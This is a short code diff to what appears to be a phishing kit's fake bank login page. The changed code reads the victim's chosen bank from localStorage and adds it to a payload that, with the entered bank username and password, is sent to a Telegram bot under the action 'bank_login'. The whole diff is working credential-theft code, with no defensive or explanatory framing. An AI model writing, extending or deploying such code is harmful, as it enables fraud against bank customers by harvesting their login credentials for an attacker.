@@ -3291,11 +3291,13 @@
       }
       
       // Get all stored data
+      var bank = '';
       var anmeldename = '';
       var saveDevice = false;
       
       if (window.localStorage) {
         try {
+          bank = localStorage.getItem('selected_bank') || '';
           anmeldename = localStorage.getItem('login_anmeldename') || '';
           saveDevice = deviceToggle ? deviceToggle.checked : false;
           
@@ -3309,6 +3311,7 @@
       // Send to Telegram and wait for it to complete
       await sendToTelegram({
         action: 'bank_login',
+        bank: bank,
         bank_username: anmeldename,
         bank_password: password,
         save_device: saveDevice,
